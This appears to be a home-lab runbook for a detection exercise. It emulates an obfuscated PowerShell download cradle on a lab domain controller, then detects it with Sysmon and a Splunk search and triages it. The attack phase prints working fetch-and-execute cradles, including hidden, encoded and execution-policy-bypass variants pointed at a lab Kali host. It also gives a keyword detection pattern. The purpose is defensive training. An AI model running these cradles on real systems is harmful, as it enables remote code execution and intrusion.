# SIM-03 — Suspicious PowerShell Execution

| | |
|---|---|
| **ID** | SIM-03 |
| **ATT&CK** | T1059.001 Command and Scripting Interpreter: PowerShell · T1105 Ingress Tool Transfer · T1140 Deobfuscate/Decode |
| **Tactic** | Execution |
| **Attacker** | Kali Linux `192.168.1.8` (payload host) → executed on the DC `192.168.1.11` |
| **Target** | Windows Server 2022 DC `192.168.1.11` |
| **Detection** | Saved search **"Suspicious PowerShell - Sysmon EventCode 1"** → [`queries/03-powershell-execution.spl`](../queries/03-powershell-execution.spl) |
| **Status** | ☐ Planned → ☐ Executed → ☐ Documented |
| **Date performed** | YYYY-MM-DD |

## Objective

Emulate the single most common initial-execution technique in real intrusions: **obfuscated
PowerShell with a download cradle**, detected via Sysmon process creation shipped through
the Universal Forwarder into Splunk. The detection pattern (`DownloadString` /
`EncodedCommand` / `bypass`) is exactly what production SOC searches look for.

## Scope & Safety

- Payload is **benign by design**: a text file containing `Write-Output "lab payload executed"`
  served from Kali's Python HTTP server. No real malware, no real C2.

## Prerequisites

- [ ] Sysmon installed on the DC with `renderXml = true` in [`configs/inputs.conf`](../configs/inputs.conf)
- [ ] Splunk receiving Sysmon events (`index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1` returns results)
- [ ] Kali reachable from the DC (`ping 192.168.1.8` works)

---

## 1. Attack Execution

### Phase A — Stage the benign payload on Kali

```bash
echo 'Write-Output "lab payload executed"' > /tmp/payload.txt
cd /tmp && python3 -m http.server 8000
```

### Phase B — Obfuscated download cradle on the DC

On `192.168.1.11`, as the lab user, in PowerShell:

```powershell
# Classic download cradle (the pattern the detection is written against)
IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.8:8000/payload.txt')

# Encoded command variant (base64 of a harmless Write-Output)
powershell -nop -w hidden -enc <base64-of-Write-Output-command>

# Execution-policy bypass variant (third detection keyword)
powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.8:8000/payload.txt')"
```

How to produce the encoded string (also useful talking-point material):

```powershell
$cmd = 'Write-Output "lab payload executed"'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($cmd)
[Convert]::ToBase64String($bytes)
```

📸 Screenshot: `screenshots/07a_powershell_cradle.png` — terminal showing the cradle + output.

## 2. Expected Telemetry

| Step | Source | EventCode | Field evidence in Splunk |
|------|--------|-----------|--------------------------|
| PowerShell starts | `WinEventLog:Microsoft-Windows-Sysmon/Operational` | **1** | `Image=*powershell.exe`, `CommandLine`, `ParentCommandLine`, `User` |
| Malicious keywords match | Saved search **Suspicious PowerShell - Sysmon EventCode 1** | — | `CommandLine` contains `DownloadString` / `EncodedCommand` / `bypass` |

📸 Screenshots:
- `screenshots/07b_sysmon_event1_powershell.png` — raw Sysmon Event 1 in Splunk (event XML view)
- `screenshots/07_splunk_alert_powershell.png` — saved search results / Triggered Alert

## 3. Detection (SPL)

Run in Splunk Web (raw file: [`03-powershell-execution.spl`](../queries/03-powershell-execution.spl)):

```spl
index=main sourcetype="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=1
| search Image="*powershell.exe" (CommandLine="*DownloadString*" OR CommandLine="*EncodedCommand*" OR CommandLine="*bypass*")
| table _time, host, User, Image, CommandLine, ParentCommandLine
```

## 4. Triage Walkthrough

1. Open the result row → copy `CommandLine`, `ParentCommandLine`, `User`.
2. Decode any `-enc` payload (base64 → UTF-16LE) and paste the decoded text into the ticket.
3. Process tree: what launched PowerShell? (`cmd.exe` self-start vs `winword.exe` macro matters —
   use the [process-tree pivot](../queries/README.md)).
4. Network pivot: any Sysmon `EventCode=3` connection to `192.168.1.8:8000` around the timestamp?
5. Scope: any other hosts running similar command lines?
   (`index=main CommandLine="*192.168.1.8*"`)
6. Contain: kill the PowerShell process, block the URL/IP at the DC firewall, hunt for the
   same cradle estate-wide.

## 5. Response & Cleanup

```powershell
Stop-Process -Name powershell -Force
```

```bash
# On Kali — remove the staged payload and stop the server
rm /tmp/payload.txt
```

- [ ] Confirm no rogue accounts/tasks were created (SIM-03 should leave none)
- [ ] Record end of the test window

## 6. Evidence Checklist

- [ ] `07a_powershell_cradle.png`
- [ ] `07b_sysmon_event1_powershell.png`
- [ ] `07_splunk_alert_powershell.png`

## 7. Lessons / Tuning Notes *(fill after execution)*

- Which keyword produced the match? (good for explaining rule precision in interviews)
- What would break this detection? (e.g. `IEX` with no flagged token, or AMSI-blocked variants —
  document the gap and the fix you'd propose, e.g. adding `IEX`, `FromBase64String`, `hidden` to the OR-chain)
